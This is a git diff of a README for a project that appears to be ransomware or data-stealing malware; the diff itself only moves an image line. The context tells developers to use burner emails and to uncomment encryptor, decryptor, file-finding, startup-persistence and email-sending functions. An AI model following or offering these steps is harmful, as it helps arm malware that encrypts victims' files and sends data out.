@@ -27,8 +27,8 @@ TBD
 ### For developers
 - Get 2 burner emails
 - Put it on `SENDER` and `RECEIVER` variable on the top
-![image](https://user-images.githubusercontent.com/94969176/209453494-5b28cf52-523c-4ffa-9ff8-4d07c4d9a6b6.png)
 
+![image](https://user-images.githubusercontent.com/94969176/209453494-5b28cf52-523c-4ffa-9ff8-4d07c4d9a6b6.png)
 - Get an app password for the `SENDER` email
 - Install dependencies modules
 - remove the commented out encryptor, decryptor, and find_file function alongside the function call on the bottom for inserting to startup and sending via email (I heavily advice against removing the commented out tkinter attributes and configs)
